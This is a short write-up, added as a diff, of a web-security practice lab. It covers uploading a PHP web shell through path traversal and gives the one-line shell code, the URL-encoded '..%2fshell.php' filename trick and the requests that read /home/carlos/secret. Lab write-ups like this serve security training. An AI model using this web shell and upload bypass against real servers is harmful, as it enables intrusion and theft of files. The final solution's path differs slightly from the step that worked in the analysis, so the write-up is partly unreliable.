@@ -1,0 +1,24 @@
+Lab #3 - Web shell upload via path traversal
+
+Vulnerabilities - This lab contains a vulnerable image upload function. The server is configured to prevent execution of user-supplied files, but this restriction can be bypassed by exploiting a secondary vulnerability.
+
+Goal - To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.
+
+Credentials - wiener:peter
+
+Analysis: 
+- log in with account wiener:peter
+- try to upload an image => SUCCESSFULLY
+- try to upload an php file => SUCCESSFULLY: The file avatars/shell.php has been uploaded.
+- try to make a request to execute this web shell => response: <?php echo file_get_contents($_GET['filename']); ?>
+=> this file is processed as plain-text
+- try to use path traversal to save the file into a directory that can execute code 
+    => filename: ../shell.php => GET /files/avatars/../shell.php?filename=/home/carlos/secret HTTP/2 => NOT SUCCESSFULLY
+    => filename: ../../shell.php => GET /files/avatars/../../shell.php?filename=/home/carlos/secret HTTP/2=> NOT SUCCESSFULLY
+
+- try to encode: filename: ..%2fshell.php => GET /files/avatars/../shell.php?filename=/home/carlos/secret HTTP/2 => SUCCESSFULLY
+
+Solution: 
+- upload file shell.php and use Burp Repeater to change the filename to ..%2fshell.php
+- make a GET request: 
+    GET /files/avatars/../../shell.php?filename=/home/carlos/secret HTTP/2 
